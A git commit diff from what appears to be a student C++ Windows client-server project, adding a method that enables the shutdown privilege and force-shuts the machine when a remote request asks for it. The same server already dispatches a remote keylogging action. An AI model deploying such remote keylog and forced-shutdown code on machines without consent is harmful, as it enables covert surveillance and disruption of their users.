7667f1e3ded2e9276e6b6dc7260e6773d6c7cf42
AkiraTomori <ThaiMinhHuy1407@gmail.com>
2024-11-14 10:03:44 +0700

    Update shutdownSystem method.

--- Server/src/Server.cpp
+++ Server/src/Server.cpp
@@ -29,6 +29,30 @@ bool Server::keylog(Request& request, Response &response) {
     return true;
 }
 
+void Server::shutdownSystem(){
+    HANDLE hToken;
+    TOKEN_PRIVILEGES tkp;
+    
+    // Lấy token cho tiến trình hiện tại
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)){
+        return;
+    }
+    // Lấy LUID cho đặc quyền shutdown
+    LookupPrivilegeValue(nullptr, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
+    tkp.PrivilegeCount = 1; // one privillege to set;
+    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    
+    // Kích hoạt đặc quyền shutdown cho tiến trình
+    AdjustTokenPrivileges(hToken, false, &tkp, 0, (PTOKEN_PRIVILEGES)nullptr, 0);
+    if (GetLastError() != ERROR_SUCCESS)
+        return;
+    
+    // Tắt hệ thống, buộc đóng tất cả ứng dụng
+    if (!ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER)){
+        std::cout << "Shutdown failed: Error: " << GetLastError() << "\n";
+    }
+    std::cout << "System is shutting down.....\n";
+}
 bool Server::processRequest(Request& request, Response &response) {
     cout << "Processing Request\n" << request << "\n";
     response.setAction(request.getAction());
@@ -37,6 +61,11 @@ bool Server::processRequest(Request& request, Response &response) {
     switch (request.getAction()) {
         case ACTION_KEYLOG:
             return keylog(request, response);
+        case ACTION_SHUTDOWN:
+            shutdownSystem();
+            response.putParam("Status", "Success");
+            response.putParam("Body", "System is shutting down.\n");
+            return true;
         default:
             return false;
     }
--- Server/src/Server.h
+++ Server/src/Server.h
@@ -2,9 +2,11 @@
 #define SERVER_H_
 
 #include "common/Request.h"
+#include <windows.h>
 
 class Server {
     public:
+        void shutdownSystem();
         bool keylog(Request& request, Response &response);
         bool processRequest(Request& request, Response &response);
 };
